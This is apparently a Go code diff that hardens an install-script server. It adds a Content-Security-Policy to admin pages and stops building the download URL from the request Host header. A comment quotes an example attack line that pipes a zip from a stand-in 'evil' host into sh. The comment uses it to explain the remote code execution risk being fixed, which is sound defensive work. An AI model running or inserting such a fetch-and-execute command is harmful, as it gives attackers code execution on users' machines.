@@ -9,6 +9,7 @@ import (
 	"io"
 	"io/fs"
 	"net/http"
+	"strings"
 	"sync"
 	"time"
 
@@ -64,7 +65,7 @@ var (
 	pluginVersionErr  error
 )
 
-func RegisterUIRoutes(mux *http.ServeMux) {
+func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string) {
 	sub, _ := fs.Sub(staticFiles, "static")
 	fileServer := http.FileServerFS(sub)
 
@@ -75,8 +76,29 @@ func RegisterUIRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("GET /skills/website-deploy-builder.zip", serveSkillZip("website-deploy-builder"))
 	mux.HandleFunc("GET /skills/website-deploy-builder/SKILL.md", serveSkillMarkdown("website-deploy-builder"))
 	mux.HandleFunc("GET /plugin.zip", servePluginZip)
-	mux.HandleFunc("GET /install.sh", serveInstallScript)
-	mux.Handle("GET /", fileServer)
+	mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL))
+	mux.Handle("GET /", adminUICSP(fileServer))
+}
+
+// adminUICSP adds a Content-Security-Policy to the admin UI / landing pages.
+// The page already HTML-escapes all user-controlled data; the CSP is
+// defense-in-depth. 'unsafe-inline' is permitted because the embedded admin UI
+// uses inline <script>/<style>; frame-ancestors/object-src/base-uri still close
+// off clickjacking, plugin, and base-tag injection vectors.
+func adminUICSP(next http.Handler) http.Handler {
+	const policy = "default-src 'self'; " +
+		"script-src 'self' 'unsafe-inline'; " +
+		"style-src 'self' 'unsafe-inline'; " +
+		"img-src 'self' data:; " +
+		"font-src 'self' data:; " +
+		"connect-src 'self'; " +
+		"object-src 'none'; " +
+		"base-uri 'none'; " +
+		"frame-ancestors 'none'"
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Security-Policy", policy)
+		next.ServeHTTP(w, r)
+	})
 }
 
 // serveSkillsVersion returns {"version":"X"} from the embedded plugin.json.
@@ -161,15 +183,19 @@ func servePluginZip(w http.ResponseWriter, r *http.Request) {
 // and extracts it into ~/.claude/skills (or a path passed as the first arg).
 // Designed to be either run directly (`curl … | sh`) or pasted to an agent
 // who will execute it via Bash.
-func serveInstallScript(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
-	w.Header().Set("Cache-Control", "no-cache")
-	scheme := "https"
-	if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") == "" {
-		scheme = "http"
+//
+// The download base URL is the server-configured canonical PublicBaseURL — it
+// is deliberately NOT derived from the request Host. The script is piped into
+// `sh`, so reflecting an attacker-controlled Host header would let a crafted
+// request produce a `curl https://evil/skills.zip | sh` (remote code execution
+// on the victim). PublicBaseURL already carries the correct https scheme.
+func serveInstallScript(publicBaseURL string) http.HandlerFunc {
+	base := strings.TrimRight(publicBaseURL, "/")
+	return func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+		w.Header().Set("Cache-Control", "no-cache")
+		w.Write([]byte(installScript(base)))
 	}
-	host := r.Host
-	w.Write([]byte(installScript(scheme + "://" + host)))
 }
 
 func installScript(base string) string {
